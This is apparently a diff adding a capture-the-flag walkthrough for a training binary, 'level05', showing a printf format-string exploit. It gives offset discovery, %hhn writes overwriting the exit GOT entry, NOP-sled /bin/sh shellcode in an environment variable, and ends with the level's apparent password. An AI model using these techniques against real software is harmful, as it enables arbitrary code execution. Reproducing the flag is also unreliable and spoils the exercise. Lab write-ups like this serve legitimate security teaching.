@@ -1,1 +1,75 @@
-printf exploit (no-maj)
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2019/05/22 21:41:18 by lgarczyn          #+#    #+#              #
+#    Updated: 2019/05/22 21:54:39 by lgarczyn         ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+The executable passes the input to the printf format string,
+this allows us to again execute arbitrary code.
+
+The printf format string sits slightly in front of printf, due to gets.
+
+The format string sits 40 bytes in front of the format string pointer,
+meaning we need to write %10$p to reach the first 4 bytes.
+
+As the main function never returns,
+we may not override the main return address.
+
+However, we may overwrite the exit plt or the printf return address.
+
+printf:
+The printf return address sits at 0xffffd51c on gdb with LINES and COLUMNS unset.
+
+python -c 'print "\xff\xff\xd5\xbc"[::-1] + "%10$s"' | ./level05
+
+> ff ff ff ff [...]
+
+After some fiddling, we find the address 0xffffd53c on gdb matches 0xffffd5bc on the executable.
+We can expect 0xffffd51c to be matched by 0xffffd59c.
+
+python -c 'print "\xff\xff\xd5\x9c"[::-1] + "%10$n"' | ./level05
+
+> segfault
+
+This however doesn't work every time, we change our focus to overwriting the exit plt.
+
+exit:
+
+> disas main
+
+<   0x08048507 <+195>:	call   0x8048340 <printf@plt>
+
+> disas  0x8048370 
+
+<   0x08048370 <+0>:	jmp    *0x80497e0
+
+The exit address sits at 0x80497e0
+
+We replace it with the address of our shellcode, nope-padded.
+
+export A=`echo -e -n \
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"\
+"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`
+
+Our tool tells us the address is 0xffffd7f6.
+We can use 0xffffd7ff thanks to our nope-sled.
+We have to write it in multiple passes.
+
+python -c 'print \
+"\x08\x04\x97\xe0"[::-1] + \
+"\x08\x04\x97\xe1"[::-1] + \
+"\x08\x04\x97\xe2"[::-1] + \
+"\x08\x04\x97\xe3"[::-1] + \
+"%199i" + "%11$hhn" + \
+"%40i" + "%10$hhn" + "%12$hhn" + "%13$hhn"' > a
+
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
